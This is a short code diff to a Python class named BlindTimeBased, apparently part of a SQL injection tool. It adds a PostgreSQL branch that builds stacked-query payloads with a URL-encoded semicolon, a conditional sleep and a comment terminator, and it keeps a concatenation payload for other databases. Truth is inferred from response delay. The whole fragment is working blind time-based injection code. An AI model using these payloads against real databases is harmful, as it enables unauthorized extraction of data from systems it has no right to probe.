@@ -9,7 +9,12 @@ class BlindTimeBased(BaseSQLi):
         self.delay = delay
         self.signal = DB_CONFIG[self.db_type]['sleep'].format(delay=self.delay)
     def build_condition_payload(self, condition):
-        return f"'||(SELECT CASE WHEN ({condition}) THEN {self.signal} ELSE 0 END{DB_CONFIG[self.db_type]['from_dual']})||'"
+        config = DB_CONFIG[self.db_type]
+        if self.db_type == "postgresql":
+            no_delay = config['sleep'].format(delay=0)
+            return f"'%3BSELECT CASE WHEN ({condition}) THEN {self.signal} ELSE {no_delay} END{config['comment']}"
+        else:
+            return f"'||(SELECT CASE WHEN ({condition}) THEN {self.signal} ELSE 0 END{config['from_dual']})||'"
 
     def check_signal(self, response):
         return self._last_elapsed >= self.delay
